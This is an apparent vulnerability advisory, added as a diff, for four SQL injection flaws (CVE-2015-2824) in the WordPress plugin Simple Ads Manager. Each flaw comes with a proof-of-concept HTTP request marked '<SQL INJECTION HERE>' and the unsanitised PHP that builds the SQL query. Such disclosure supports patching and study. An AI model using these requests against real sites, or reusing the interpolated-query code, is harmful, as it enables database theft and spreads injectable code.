@@ -1,0 +1,219 @@
+#Vulnerability title: Wordpress plugin Simple Ads Manager - SQL Injection
+#Product: Wordpress plugin Simple Ads Manager
+#Vendor: https://profiles.wordpress.org/minimus/
+#Affected version: Simple Ads Manager 2.5.94 and 2.5.96
+#Download link: https://wordpress.org/plugins/simple-ads-manager/
+#CVE ID: CVE-2015-2824
+#Author: Le Hong Minh (minh.h.le@itas.vn) & ITAS Team
+
+
+::PROOF OF CONCEPT::
+
+---SQL INJECTION 1---
+
++ REQUEST:
+
+POST /wp-content/plugins/simple-ads-manager/sam-ajax.php HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/28.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://target.com/archives/wordpress-plugin-simple-ads-manager/
+Content-Length: 270
+Cookie: wooTracker=cx5qN1BQ4nmu; _ga=GA1.2.344989027.1425640938; PHPSESSID=kqvtir87g33e2ujkc290l5bmm7; cre_datacookie=8405688a-3dec-4d02-9405-68f53281e991; _gat=1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+action=sam_hits&hits%5B0%5D%5B%5D=<SQL INJECTION HERE>&hits%5B1%5D%5B%5D=<SQL INJECTION HERE>&hits%5B2%5D%5B%5D=<SQL INJECTION HERE>&level=3
+
+
+- Vulnerable file: simple-ads-manager/sam-ajax.php
+- Vulnerable code:
+
+	  case 'sam_ajax_sam_hits':
+		  if(isset($_POST['hits']) && is_array($_POST['hits'])) {
+			  $hits = $_POST['hits'];
+			  $values = '';
+			  $remoteAddr = $_SERVER['REMOTE_ADDR'];
+			  foreach($hits as $hit) {
+				  $values .= ((empty($values)) ? '' : ', ') . "({$hit[1]}, {$hit[0]}, NOW(), 0, \"{$remoteAddr}\")";
+			  }
+			  $sql = "INSERT INTO $sTable (id, pid, event_time, event_type, remote_addr) VALUES {$values};";
+			  $result = $wpdb->query($sql);
+			  if($result > 0) echo json_encode(array('success' => true, 'sql' => $sql, 'addr' => $_SERVER['REMOTE_ADDR']));
+			  else echo json_encode(array(
+				  'success' => false,
+				  'result' => $result,
+				  'sql' => $sql,
+				  'hits' => $hits,
+				  'values' => $values
+			  ));	
+		  }
+		  break;
+
+
+		  
+		  
+---SQL INJECTION 2---
++REQUEST
+POST /wp-content/plugins/simple-ads-manager/sam-ajax-admin.php HTTP/1.1
+Host: hostname
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+
+action=load_posts&cstr=<SQL INJECTION HERE>&sp=Post&spg=Page
+
++ Vulnerable file: simple-ads-manager/sam-ajax-admin.php
++ Vulnerable code:
+case 'sam_ajax_load_posts':
+      $custs = (isset($_REQUEST['cstr'])) ? $_REQUEST['cstr'] : '';
+      $sPost = (isset($_REQUEST['sp'])) ? urldecode( $_REQUEST['sp'] ) : 'Post';
+      $sPage = (isset($_REQUEST['spg'])) ? urldecode( $_REQUEST['spg'] ) : 'Page';
+
+      //set @row_num = 0;
+      //SELECT @row_num := @row_num + 1 AS recid
+      $sql = "SELECT
+                wp.id,
+                wp.post_title AS title,
+                wp.post_type AS type
+              FROM
+                $postTable wp
+              WHERE
+                wp.post_status = 'publish' AND
+                FIND_IN_SET(wp.post_type, 'post,page{$custs}')
+              ORDER BY wp.id;";
+
+      $posts = $wpdb->get_results($sql, ARRAY_A);
+
+      $k = 0;
+      foreach($posts as &$val) {
+        switch($val['type']) {
+          case 'post':
+            $val['type'] = $sPost;
+            break;
+          case 'page':
+            $val['type'] = $sPage;
+            break;
+          default:
+            $val['type'] = $sPost . ': '.$val['type'];
+            break;
+        }
+        $k++;
+        $val['recid'] = $k;
+      }
+      $out = array(
+        'status' => 'success',
+        'total' => count($posts),
+        'records' => $posts
+      );
+      break;
+
+	  
+	  
+---SQL INJECTION 3---
++REQUEST:
+
+POST /wp-content/plugins/simple-ads-manager/sam-ajax-admin.php?searchTerm=<SQL INJECTION HERE> HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __utma=30068390.891873145.1426646160.1426734944.1427794022.6; __utmz=30068390.1426646160.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); wp-settings-1=hidetb%3D1%26libraryContent%3Dbrowse%26imgsize%3Dfull%26align%3Dcenter%26urlbutton%3Dpost%26editor%3Dtinymce%26mfold%3Do%26advImgDetails%3Dshow%26ed_size%3D456%26dfw_width%3D822%26wplink%3D1; wp-settings-time-1=1426646255; PHPSESSID=9qrpbn6kh66h4eb102278b3hv5; wordpress_test_cookie=WP+Cookie+check; bp-activity-oldestpage=1; __utmb=30068390.1.10.1427794022; __utmc=30068390
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+action=load_combo_data
+
++ Vulnerable file: simple-ads-manager/sam-ajax-admin.php
++Vulnerable code: from line 225 to 255
+    case 'sam_ajax_load_combo_data':
+      $page = $_GET['page'];
+      $rows = $_GET['rows'];
+      $searchTerm = $_GET['searchTerm'];
+      $offset = ((int)$page - 1) * (int)$rows;
+      $sql = "SELECT
+                wu.id,
+                wu.display_name AS title,
+                wu.user_nicename AS slug,
+                wu.user_email AS email
+              FROM
+                $uTable wu
+              WHERE wu.user_nicename LIKE '{$searchTerm}%'
+              ORDER BY wu.id
+              LIMIT $offset, $rows;";
+      $users = $wpdb->get_results($sql, ARRAY_A);
+      $sql = "SELECT COUNT(*) FROM $uTable wu WHERE wu.user_nicename LIKE '{$searchTerm}%';";
+      $rTotal = $wpdb->get_var($sql);
+      $total = ceil((int)$rTotal/(int)$rows);
+      $out = array(
+        'page' => $page,
+        'records' => count($users),
+        'rows' => $users,
+        'total' => $total,
+        'offset' => $offset
+      );
+      break;
+
+	  
+	  
+	  
+---SQL INJECTION 4---
+
++ REQUEST
+
+POST /wp-content/plugins/simple-ads-manager/sam-ajax-admin.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __utma=30068390.891873145.1426646160.1426734944.1427794022.6; __utmz=30068390.1426646160.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); wp-settings-1=hidetb%3D1%26libraryContent%3Dbrowse%26imgsize%3Dfull%26align%3Dcenter%26urlbutton%3Dpost%26editor%3Dtinymce%26mfold%3Do%26advImgDetails%3Dshow%26ed_size%3D456%26dfw_width%3D822%26wplink%3D1; wp-settings-time-1=1426646255; PHPSESSID=9qrpbn6kh66h4eb102278b3hv5; wordpress_test_cookie=WP+Cookie+check; bp-activity-oldestpage=1; __utmc=30068390
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+
+action=load_users&subscriber=<SQL INJECTION HERE>&contributor=<SQL INJECTION HERE>&author=<SQL INJECTION HERE>&editor=<SQL INJECTION HERE>&admin=<SQL INJECTION HERE>&sadmin=<SQL INJECTION HERE>
+
++ Vulnerable file: simple-ads-manager/sam-ajax-admin.php
+
++ Vulnerable code: from line 188 to 223
+    case 'sam_ajax_load_users':
+      $roleSubscriber = (isset($_REQUEST['subscriber'])) ? urldecode($_REQUEST['subscriber']) : 'Subscriber';
+      $roleContributor = (isset($_REQUEST['contributor'])) ? urldecode($_REQUEST['contributor']) : 'Contributor';
+      $roleAuthor = (isset($_REQUEST['author'])) ? urldecode($_REQUEST['author']) : 'Author';
+      $roleEditor = (isset($_REQUEST['editor'])) ? urldecode($_REQUEST['editor']) : 'Editor';
+      $roleAdministrator = (isset($_REQUEST["admin"])) ? urldecode($_REQUEST["admin"]) : 'Administrator';
+      $roleSuperAdmin = (isset($_REQUEST['sadmin'])) ? urldecode($_REQUEST['sadmin']) : 'Super Admin';
+      $sql = "SELECT
+                wu.id,
+                wu.display_name AS title,
+                wu.user_nicename AS slug,
+                (CASE wum.meta_value
+                  WHEN 0 THEN '$roleSubscriber'
+                  WHEN 1 THEN '$roleContributor'
+                  WHEN 2 THEN '$roleAuthor'
+                  ELSE
+                    IF(wum.meta_value > 2 AND wum.meta_value <= 7, '$roleEditor',
+                      IF(wum.meta_value > 7 AND wum.meta_value <= 10, '$roleAdministrator',
+                        IF(wum.meta_value > 10, '$roleSuperAdmin', NULL)
+                      )
+                    )
+                END) AS role
+              FROM $uTable wu
+              INNER JOIN $umTable wum
+                ON wu.id = wum.user_id AND wum.meta_key = '$userLevel'
+              ORDER BY wu.id;";
+      $users = $wpdb->get_results($sql, ARRAY_A);
+      $k = 0;
+      foreach($users as &$val) {
+        $k++;
+        $val['recid'] = $k;
+      }
+      $out = $users;
+      break;
